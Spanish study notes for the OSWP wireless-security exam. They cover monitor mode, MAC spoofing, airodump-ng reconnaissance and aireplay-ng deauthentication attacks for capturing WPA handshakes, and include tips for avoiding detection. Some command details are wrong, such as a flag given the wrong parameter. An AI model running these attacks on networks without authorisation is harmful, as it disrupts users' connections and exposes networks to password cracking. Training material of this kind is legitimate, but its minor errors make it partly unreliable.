# Preparación OSWP (Curso s4vitar)

# Índice de los contenidos
- [[#1. Modo monitor CONCEPTO|1. Modo monitor CONCEPTO]]
- [[#2. Configuración de la tarjeta de red en modo monitor|# 2. Configuración de la tarjeta de red en modo monitor]]
---------------
# Contenido Resumido y Ampliado del Curso

## 1. Modo monitor CONCEPTO

El modo monitor es fundamental para cualquier ataque a redes inalámbricas, ya que permite a la tarjeta de red capturar todos los paquetes que circulan por el aire, independientemente de a quién vayan dirigidos.

### Explicación técnica:
- **Definición**: El modo monitor es un estado especial de las tarjetas de red inalámbricas que permite capturar todos los paquetes sin estar asociado a ningún punto de acceso.
- **Diferencia con modo normal**: En modo normal (managed), la tarjeta solo procesa paquetes dirigidos a su MAC.

## 2. Configuración de la tarjeta de red en modo monitor

### Procedimiento detallado:
1. Identificar la interfaz inalámbrica:
   ```bash
   ifconfig
   ```

2.  Detener procesos que puedan interferir:
   ```bash
airmon-ng check kill
# Esto mata NetworkManager, wpa_supplicant, dhclient, etc.
```

3. Activar el modo monitor:
   ```bash
   sudo airmon-ng start wlan0
   ```
   Donde "wlan0" debe reemplazarse por el nombre de tu interfaz.

- Otra opción: de forma manual:
```bash
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up
```

4. Verificar que el modo monitor está activo:
   ```bash
   # ya no se ve en ifconfig
   iwconfig
   # si pone 'DOWN':
   ifconfig wlan0 up
   ```
   La interfaz debería mostrar "Mode:Monitor"

6. Parar el modo monitor:
   ```bash
   airmon-ng stop wlan0
   /etc/init.d/networking restart
   ```

### ¿Qué es **`wpa_supplicant`**?
Es el proceso que se encarga de gestionar la conexión WiFi segura en Linux. Función:
- Autenticarte en el punto de acceso.
- Manejar la negociación de claves.
- Mantener la conexión activa.

Sin `wpa_supplicant`, no te puedes conectar a redes WiFi cifradas.

Por eso, cuando estás conectado a WiFi normal (modo _managed_), el proceso está corriendo en segundo plano.

Cuando pones la tarjeta en **modo monitor**, este proceso sigue intentando gestionar la conexión WiFi, y te puede interferir (por eso se recomienda matarlo con `airmon-ng check kill`).
### ¿Qué es **`dhclient`**?
 Es el cliente DHCP de Linux. Función:

- Pedirle al router una dirección IP cuando te conectas a una red.
- Configurar la IP, la máscara de red, la puerta de enlace, etc.

En modo monitor, **no necesitas IP**, porque no te vas a asociar a ninguna red, sólo a capturar paquetes. Por eso se recomienda matar `dhclient` también.

## 3. Falsificación de nuestra dirección MAC y tips

La falsificación de la dirección MAC es una técnica importante para mantener el anonimato durante las pruebas de penetración y evitar ser detectado o bloqueado.

### Procedimiento técnico:
1. Importante desactivar la interfaz:
   ```bash
   ifconfig wlan0mon down
   ```

 2. Verificar la dirección MAC:
   ```bash
   macchanger -s wlan0mon
   ```

3. Cambiar la dirección MAC:
   ```bash
   macchanger --mac=00:11:22:33:44:55 wlan0mon
   ```
   O para generar una MAC aleatoria:
   ```bash
   macchanger -r wlan0mon
   ```

4. Reactivar la interfaz:
   ```bash
   ifconfig wlan0mon up
   ```

### Tips adicionales:
- Usar direcciones MAC de fabricantes reales para evitar detección
```bash
macchanger -l | greep -i "fabricante"
# los últimos 6 pueden ser inventados
```
- Cambiar la MAC regularmente durante sesiones largas de auditoría
- Algunas tarjetas requieren ser reiniciadas completamente para que el cambio sea efectivo
### Consideraciones de seguridad:
- Los puntos de acceso modernos pueden detectar comportamientos sospechosos incluso con MAC falsificada
- Algunos routers empresariales tienen sistemas de detección de intrusiones que pueden identificar patrones de tráfico anómalos

## 4. Uso de Airodump para efectuar un análisis del entorno (P.A.)

Airodump-ng es una herramienta fundamental para la recopilación de información sobre redes inalámbricas en el entorno, permitiendo identificar puntos de acceso, clientes conectados y otros datos relevantes.
### Comando básico:
```bash
airodump-ng wlan0mon
```

### Información mostrada:
- Primera línea:
		Canal, Tiempo transcurrido, fecha, y si se ha capturado un handshake y de que red

- **BSSID**: Dirección MAC del punto de acceso
- **PWR**: Nivel de señal (cuanto más cercano a 0, más fuerte). Si es -1 significa que estamos fuera del alcance o que el controlador no acepta informes de nivel de señal
- **Beacons**: Número de paquetes beacon capturados
- **Data**: Paquetes de datos (importante para capturar handshakes)
- `#/s` nº de paquetes de datos enviados por segundo (ultimos 10 seg)
- **CH**: Canal en el que opera la red
- **MB**: Velocidad máxima soportada
- **ENC**: Tipo de cifrado (WEP, WPA, WPA2,OPN)
- **CIPHER**: Algoritmo de cifrado (TKIP, CCMP)
- **AUTH**: Tipo de autenticación (PSK, MGT)
- **ESSID**: Nombre de la red

### Consideraciones importantes:
- Las redes WPA y WPA2 se muestran de forma diferente en Airodump
- WPA utiliza típicamente TKIP como cifrado
- WPA2 utiliza típicamente CCMP (basado en AES) como cifrado
- Solo se pueden atacar redes con autenticación PSK (Pre-Shared Key)
- Las redes empresariales (AUTH=MGT) utilizan autenticación 802.1X y no son vulnerables a los ataques de diccionario convencionales

### Vulnerabilidades específicas:
- WPA con TKIP es vulnerable a ataques de reinstalación de clave (KRACK)
- WPA2 con CCMP ofrece mejor seguridad pero sigue siendo vulnerable a ataques de fuerza bruta si la contraseña es débil


## 5. Uso de Airodump para efectuar un análisis del entorno 2 (clientes)

### Técnicas avanzadas:
1. Monitorización de clientes conectados:
   ```bash
   airodump-ng -c [canal] --bssid [MAC_del_AP] wlan0mon
   ```

2. Identificación de relaciones cliente-AP:
	La parte inferior de la pantalla de Airodump muestra los clientes y a qué AP están conectados

   - **STATION**: Dirección MAC del cliente
   - **PWR**: Nivel de señal del cliente
   - **Rate**: Velocidad de transmisión
   - **Lost**: Paquetes perdidos
   - **Frames**: Número de frames capturados
   - **Probes**: Redes a las que el cliente ha intentado conectarse anteriormente

### Consideraciones de versiones:
- Las redes WPA y WPA2 se tratan de manera similar en esta fase de reconocimiento
- Los clientes conectados a redes WPA2-Enterprise no mostrarán información útil para ataques de PSK

### Limitaciones:
- Algunos dispositivos modernos utilizan MAC aleatoria para probe requests, dificultando el seguimiento
- Los dispositivos iOS y Android recientes ocultan el SSID real en sus probe requests como medida de privacidad
- La efectividad depende de la actividad de los clientes en la red

## 6. Modos de filtro con Airodump

Este video explica las diferentes opciones de filtrado en Airodump-ng para optimizar la captura de información relevante y reducir el ruido.

### Opciones de filtrado principales:

| **Función**                        | **Comando**                                                                             |
| ---------------------------------- | --------------------------------------------------------------------------------------- |
| Filtrado por canal                 | `bash<br>airodump-ng -c 6 wlan0mon<br>`                                                 |
| Uso de listas de BSSIDs            | `airodump-ng -c 1,6,11 wlan0mon`                                                        |
| Filtrado por BSSID (MAC del AP)    | `bash<br>airodump-ng --bssid 00:11:22:33:44:55 wlan0mon<br>`                            |
| Filtrado por ESSID (nombre de red) | `bash<br>airodump-ng --essid "NombreDeRed" wlan0mon<br>`                                |
| Combinación de filtros             | `bash<br>airodump-ng -c 6 --bssid 00:11:22:33:44:55 --essid "NombreDeRed" wlan0mon<br>` |

## 7. Exportación de evidencias con Airodump

Este video muestra cómo guardar la información capturada por Airodump-ng para su posterior análisis o como evidencia en auditorías de seguridad.

### Opciones de exportación:
| **Descripción**               | **Comando**                                                                       |
| ----------------------------- | --------------------------------------------------------------------------------- |
| Guardar en formato básico     | `airodump-ng -w <nombreArchivo>  wlan0mon`                                        |
| Guardar con filtros aplicados | `airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w <nombreArchivo>  wlan0mon`         |
| Especificar formato de salida | `airodump-ng -w <nombreArchivo>  --output-format pcap,csv,kismet,netxml wlan0mon` |
de aquí salen unos 5 archivos. el que nos interesa es el .cap

- Para ver el tamaño del fichero durante la captura (en otra terminal):
```bash
watch -n 1 du -hc captura-01.cap
```
### Formatos de archivo generados:
•captura-01.cap: Archivo de captura en formato pcap (compatible con Wireshark)
•captura-01.csv: Datos en formato CSV para análisis en hojas de cálculo
•captura-01.kismet.csv: Formato compatible con Kismet
•captura-01.kismet.netxml: Datos en formato XML

### Consideraciones importantes:
- Para capturas específicas de handshakes, es recomendable usar el formato pcap
- Se recomienda usar la opción --write-interval para dividir capturas largas

### Comando completo recomendado:
```bash
airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w captura --output-format pcap --write-interval 300 wlan0mon
```

### Aplicabilidad por versiones:
- Estos filtros funcionan igual para redes WPA y WPA2
- Para redes que utilizan band steering (cambio entre 2.4GHz y 5GHz), puede ser necesario monitorear múltiples canales

## 8. Concepto de HandShake

### Explicación técnica del handshake:
- El handshake es un proceso de 4 vías (4-way handshake) que ocurre cuando un cliente se conecta a una red WPA/WPA2
- Durante este proceso, el cliente y el punto de acceso intercambian información para derivar las claves de cifrado
- El handshake contiene suficiente información para verificar contraseñas offline

### Estructura del 4-way handshake:
Durante este intercambio, el cliente y el punto de acceso (AP) **generan y verifican las claves que cifrarán la comunicación**.
1. AP → Cliente: Envía ANonce (número aleatorio)
2. Cliente → AP: Envía SNonce y MIC (código de integridad del mensaje)
3. AP → Cliente: Envía GTK (Group Temporal Key) cifrada
4. Cliente → AP: Confirmación

### Vulnerabilidades específicas:
- Ni WPA ni WPA2 son vulnerables a ataques de recuperación de clave a partir del handshake
- La única forma de obtener la contraseña es mediante fuerza bruta o diccionario
- WPA con TKIP es vulnerable a ataques adicionales como el ataque Beck-Tews
- WPA2 con CCMP es vulnerable a KRACK (Key Reinstallation Attack) en implementaciones específicas

## 9. Ataque de Deautenticación dirigido

Este video explica cómo realizar un ataque de deautenticación dirigido para forzar a un cliente específico a desconectarse y reconectarse, generando así un handshake que puede ser capturado.

- No requieren autenticación para ser procesados (vulnerabilidad de diseño)
### Procedimiento detallado:
1. Identificar el AP objetivo y un cliente conectado:
   ```bash
   airodump-ng -c [canal] --bssid [MAC_del_AP] -w captura wlan0mon
   ```

2. Ejecutar el ataque de deautenticación dirigido:
   ```bash
   aireplay-ng -0 10 -e [ESSID_del_AP] -c [MAC_del_cliente] wlan0mon
   ```
   Donde:
   - `-0` indica ataque de deautenticación
   - `10` es el número de paquetes a enviar
   - `-a` especifica el BSSID del AP
   - `-e` especifica el ESSID del AP
   - `-c` especifica la MAC del cliente objetivo

### Consideraciones prácticas:
- Usar pocos paquetes (1-5) para ser menos detectable
- Verificar que el handshake ha sido capturado (aparecerá "WPA handshake" en la esquina superior derecha de airodump-ng)
- Algunos dispositivos modernos pueden ignorar frames de deautenticación sospechosos
- La efectividad depende de la distancia y potencia de la señal

### Contramedidas y limitaciones:
- Algunos APs empresariales detectan ataques de deautenticación
- WPA3 implementa protección contra este tipo de ataques
- Este ataque es detectable por sistemas de detección de intrusiones inalámbricas (WIDS)

## 10. Ataque de Deautenticación global (Broadcast MAC Address)

Este video muestra una variante más agresiva del ataque de deautenticación, dirigida a todos los clientes de una red simultáneamente.

### Diferencias con el ataque dirigido:
- Afecta a todos los clientes conectados al AP
- Más efectivo para capturar handshakes en redes con múltiples clientes
- Muy visible para administradores de red y sistemas de seguridad

### Procedimiento técnico:
1. Identificar el AP objetivo:
   ```bash
   airodump-ng -c [canal] --bssid [MAC_del_AP] -w captura wlan0mon
   ```

2. Ejecutar el ataque de deautenticación global:
   ```bash
   aireplay-ng -0 10 -e [BSSID_del_AP] wlan0mon
   ```
   Donde:
   - `-0` indica ataque de deautenticación
   - `10` es el número de paquetes a enviar (más que en el ataque dirigido). Si queremos mandar un nº ilimitado de paquetes (hasta que hagamos ctl C) debemos poner como número de paquetes “0”
   - `-a` especifica el BSSID del AP
   - `-e` especifica el ESSID del AP
   - La ausencia de `-c` hace que el ataque sea broadcast

Otra forma similar:
```bash
aireplay-ng -0 <numPaquetes> -e <nombreRed> -c FF:FF:FF:FF:FF:FF <nombreTarjetaRed>
```
